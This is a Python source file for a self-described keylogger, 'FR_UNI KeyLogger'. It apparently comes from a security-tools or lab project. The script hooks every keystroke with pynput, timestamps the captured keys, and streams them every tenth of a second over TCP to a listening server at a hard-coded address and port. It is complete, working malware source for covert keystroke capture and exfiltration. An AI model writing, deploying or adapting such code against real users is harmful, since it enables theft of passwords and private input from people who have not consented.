import os
from pynput import keyboard
from datetime import datetime
import time
import pyfiglet
from colorama import Fore
import socket
import sys

# Ensure the Errors module can be imported
sys.path.append(os.path.join(os.path.dirname(__file__), '..', '..'))
from Errors.FR_Errors import get_error_message

text = pyfiglet.figlet_format("FR_UNI KeyLogger")
print(Fore.BLUE + text)

keys_pressed = []

def keyPressed(key):
    global keys_pressed
    print(str(key))
    try:
        char = key.char
        keys_pressed.append(char)
    except AttributeError:
        key_str = str(key).replace("Key.", "")
        keys_pressed.append(f"{{{key_str}}}")

def send_log_to_server(log_data):
    server_ip = '192.168.56.1'  # Replace with your server's IP address
    server_port = 9999
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((server_ip, server_port))
            s.sendall(log_data.encode('utf-8'))
    except ConnectionRefusedError:
        print(get_error_message("004"))

def write_log():
    global keys_pressed
    if keys_pressed:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_data = f"{timestamp} - {''.join(keys_pressed)}\n"
        send_log_to_server(log_data)
        keys_pressed = []

def cleanup():
    send_log_to_server("\n\n")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    try:
        while True:
            write_log()
            time.sleep(0.1)  # Write log every 0.1 seconds
    except KeyboardInterrupt:
        cleanup()